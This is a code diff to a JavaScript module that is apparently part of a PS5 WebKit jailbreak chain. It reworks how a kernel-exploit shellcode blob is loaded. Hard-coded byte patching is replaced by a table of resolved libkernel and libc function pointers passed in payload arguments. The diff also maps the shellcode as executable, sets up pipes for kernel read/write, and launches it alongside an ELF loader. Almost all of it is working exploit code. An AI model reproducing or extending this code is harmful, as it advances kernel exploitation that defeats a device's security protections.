@@ -4,49 +4,39 @@ const O_NONBLOCK = 0x4;
 const PROT_RW = 0x3, PROT_RWX = 0x7;
 const MAP_SHARED = 0x1, MAP_PRIVATE_ANON = 0x1002;
 
-const DEFAULT_KEXP = "kexp_2026_05_25.bin";
 /* The autoloader serves this page at <app>/relapse/index.html, so a single
    "../" climbs out of the exploit dir into the versioned app dir. */
 const SHARED_BASE = "../shared/";
+const DEFAULT_KEXP = "kexp-ps5.bin";
 const DEFAULT_ELFLDR = "elfldr-ps5.elf";
 
-const SHELLCODE = {
-  size: 18912,
-  resolverCalls: [
-    [0x1c, [0xe8, 0xcf, 0x00, 0x00, 0x00]],
-    [0x23, [0xe8, 0x78, 0x01, 0x00, 0x00]],
-  ],
-  getpid: {
-    at: 0x10f1,
-    bytes: [
-      0x48, 0x8d, 0x35, 0xac, 0x30, 0x00, 0x00,
-      0x48, 0x8d, 0x55, 0xd0, 0xbf, 0x01, 0x20, 0x00, 0x00,
-      0xe8, 0x41, 0x2b, 0x00, 0x00,
-    ],
-    tail: [0x48, 0x89, 0x45, 0xd0, 0x31, 0xc0],
-    tailAt: 0x10fb,
-    padFrom: 0x1101,
-    padTo: 0x1106,
-  },
-  logCalls: [0x126d, 0x12ad, 0x3bc2],
-  imports: {
-    libkernel: {
-      sceKernelSendNotificationRequest: 0x48b0,
-      sysctlbyname: 0x48b8,
-      pthread_create: 0x48c0,
-      pthread_join: 0x48c8,
-    },
-    libc: {
-      malloc: 0x48d0,
-      free: 0x48d8,
-      memcpy: 0x48e0,
-      memset: 0x48e8,
-      strcmp: 0x48f0,
-      memcmp: 0x48f8,
-      vsnprintf: 0x4900,
-    },
-  },
-};
+/* Fixed KEXP_API_* contract (ps5-kexp include/types.h):
+   [0] sceKernelSendNotificationRequest   (libkernel)
+   [1] sysctlbyname                       (libkernel)
+   [2] pthread_create                     (libkernel)
+   [3] pthread_join                       (libkernel)
+   [4] getpid                             (libkernel)
+   [5] malloc                             (libSceLibcInternal)
+   [6] free                               (libSceLibcInternal)
+   [7] memcpy                             (libSceLibcInternal)
+   [8] memset                             (libSceLibcInternal)
+   [9] strcmp                             (libSceLibcInternal)
+   [10] memcmp                            (libSceLibcInternal)
+   [11] vsnprintf                         (libSceLibcInternal) */
+const KEXP_API_ENTRIES = [
+  { group: "libkernel", name: "sceKernelSendNotificationRequest" },
+  { group: "libkernel", name: "sysctlbyname" },
+  { group: "libkernel", name: "pthread_create" },
+  { group: "libkernel", name: "pthread_join" },
+  { group: "libkernel", name: "getpid" },
+  { group: "libc", name: "malloc" },
+  { group: "libc", name: "free" },
+  { group: "libc", name: "memcpy" },
+  { group: "libc", name: "memset" },
+  { group: "libc", name: "strcmp" },
+  { group: "libc", name: "memcmp" },
+  { group: "libc", name: "vsnprintf" },
+];
 
 const PIPE = { count: 0x00, in: 0x04, out: 0x08, size: 0x0c, buffer: 0x10, defaultSize: 0x4000 };
 const FD_ENTRY = { ofiles: 0x08, stride: 0x30, data: 0x00 };
@@ -56,42 +46,26 @@ function readU32(bytes, offset) {
     (bytes[offset + 2] << 16) | (bytes[offset + 3] << 24)) >>> 0;
 }
 
-function writeU64(bytes, offset, value) {
-  let rest = BigInt(value) & 0xffffffffffffffffn;
-  for (let i = 0; i < 8; i++) {
-    bytes[offset + i] = Number(rest & 0xffn);
-    rest >>= 8n;
-  }
-}
-
-function matches(bytes, offset, expected) {
-  return expected.every((byte, index) => bytes[offset + index] === byte);
-}
-
 function hex(value) {
   return "0x" + (value instanceof int64 ? value.toString(16) : (Number(value) >>> 0).toString(16));
 }
 
-function resolveSymbols(p) {
+function buildApiTable(p) {
   const tables = window.SYMBOLS || {};
   const bases = { libkernel: p.libKernelBase, libc: p.libSceLibcInternalBase };
-  const resolved = {};
 
-  for (const [group, imports] of Object.entries(SHELLCODE.imports)) {
+  const table = p.malloc(KEXP_API_ENTRIES.length * 8);
+  for (let i = 0; i < KEXP_API_ENTRIES.length; i++) {
+    const { group, name } = KEXP_API_ENTRIES[i];
     const base = bases[group];
     const offsets = tables[group];
     if (!base || (base.low === 0 && base.hi === 0))
       throw new Error("kexp: " + group + " base is unresolved");
-    if (!offsets) throw new Error("kexp: " + group + " symbols are missing");
-
-    const names = Object.keys(imports);
-    if (group === "libkernel") names.push("getpid");
-    const missing = names.filter((name) => typeof offsets[name] !== "number");
-    if (missing.length)
-      throw new Error("kexp: " + group + " is missing " + missing.join(", "));
-    resolved[group] = { base, offsets };
+    if (!offsets || typeof offsets[name] !== "number")
+      throw new Error("kexp: " + group + " symbol " + name + " is missing");
+    p.write8(table.add32(i * 8), base.add32(offsets[name]));
   }
-  return resolved;
+  return table;
 }
 
 /* `baseDir` is a directory prefix relative to this page; it defaults to the
@@ -206,35 +180,6 @@ export async function loadAutoloadPayload(p, chain, name, baseDir, log) {
   return payload.size;
 }
 
-function patchShellcode(blob, symbols) {
-  if (blob.length !== SHELLCODE.size)
-    throw new Error("kexp: expected " + SHELLCODE.size + " bytes, got " + blob.length);
-  if (SHELLCODE.resolverCalls.some(([offset, bytes]) => !matches(blob, offset, bytes)) ||
-      !matches(blob, SHELLCODE.getpid.at, SHELLCODE.getpid.bytes))
-    throw new Error("kexp: shellcode signature does not match");
-
-  for (const [offset] of SHELLCODE.resolverCalls)
-    for (let i = 0; i < 5; i++) blob[offset + i] = 0x90;
-
-  const addressOf = (group, name) => {
-    const { base, offsets } = symbols[group];
-    return (BigInt(base.hi) << 32n) + BigInt(base.low >>> 0) + BigInt(offsets[name]);
-  };
-  for (const [group, imports] of Object.entries(SHELLCODE.imports))
-    for (const [name, offset] of Object.entries(imports))
-      writeU64(blob, offset, addressOf(group, name));
-
-  const { at, tail, tailAt, padFrom, padTo } = SHELLCODE.getpid;
-  blob[at] = 0x48;
-  blob[at + 1] = 0xb8;
-  writeU64(blob, at + 2, addressOf("libkernel", "getpid"));
-  tail.forEach((byte, index) => blob[tailAt + index] = byte);
-  for (let i = padFrom; i < padTo; i++) blob[i] = 0x90;
-
-  for (const offset of SHELLCODE.logCalls)
-    if (blob[offset] === 0xe8)
-      for (let i = 0; i < 5; i++) blob[offset + i] = 0x90;
-}
 
 async function mapExecutable(blob, p, chain) {
   const length = (blob.length + 0x3fff) & ~0x3fff;
@@ -305,8 +250,10 @@ async function prepareShellcodePipes(krw, master, victim) {
     throw new Error("kexp: pipe bootstrap failed");
 }
 
-async function spawnAndJoin(entry, args, symbols, p, chain) {
-  const { base, offsets } = symbols.libkernel;
+async function spawnAndJoin(entry, args, p, chain) {
+  const tables = window.SYMBOLS || {};
+  const offsets = tables.libkernel || {};
+  const base = p.libKernelBase;
   const create = offsets.pthread_create_name_np === undefined
     ? offsets.pthread_create
     : offsets.pthread_create_name_np;
@@ -334,22 +281,25 @@ export async function runKexp(krw, p, chain, log) {
   const allproc = krw.ktextBase.add32(allprocRva);
   if ((allproc.hi & 0xffff0000) >>> 0 !== 0xffff0000)
     throw new Error("kexp: invalid allproc address " + hex(allproc));
-  const symbols = resolveSymbols(p);
 
   /* WebKit Autoloader: boot the shared localhost-only elfldr from ../shared/
      instead of the bundled payloads/elfldr-ps5-1360.elf. */
   const elfldr = await mapElf(DEFAULT_ELFLDR, p, chain, SHARED_BASE);
 
-  const blob = await fetchBinary(DEFAULT_KEXP);
-  patchShellcode(blob, symbols);
+  /* WebKit Autoloader: run the shared kexp shellcode from ../shared/
+     without in-memory binary patching. Pre-resolved function pointers are
+     passed via the KXP2 API table in payload args. */
+  const blob = await fetchBinary(DEFAULT_KEXP, SHARED_BASE);
   const entry = await mapExecutable(blob, p, chain);
 
   const master = await makePipePair(p, chain);
   const victim = await makePipePair(p, chain);
   await prepareShellcodePipes(krw, master, victim);
 
-  const args = p.malloc(0x28);
-  for (let offset = 0; offset < 0x28; offset += 8) p.write8(args.add32(offset), 0);
+  const apiTable = buildApiTable(p);
+
+  const args = p.malloc(0x38);
+  for (let offset = 0; offset < 0x38; offset += 8) p.write8(args.add32(offset), 0);
   p.write4(args.add32(0x00), master.readFd);
   p.write4(args.add32(0x04), master.writeFd);
   p.write4(args.add32(0x08), victim.readFd);
@@ -357,8 +307,11 @@ export async function runKexp(krw, p, chain, log) {
   p.write8(args.add32(0x10), allproc);
   p.write8(args.add32(0x18), elfldr.base);
   p.write8(args.add32(0x20), elfldr.size);
+  p.write4(args.add32(0x28), 0x4b585032); // 'KXP2'
+  p.write4(args.add32(0x2c), KEXP_API_ENTRIES.length);
+  p.write8(args.add32(0x30), apiTable);
 
-  const result = await spawnAndJoin(entry, args, symbols, p, chain);
+  const result = await spawnAndJoin(entry, args, p, chain);
   if (result.joinResult !== 0)
     throw new Error("kexp: pthread_join returned " + hex(result.joinResult));
   say("elfldr returned " + hex(result.shellcodeResult));
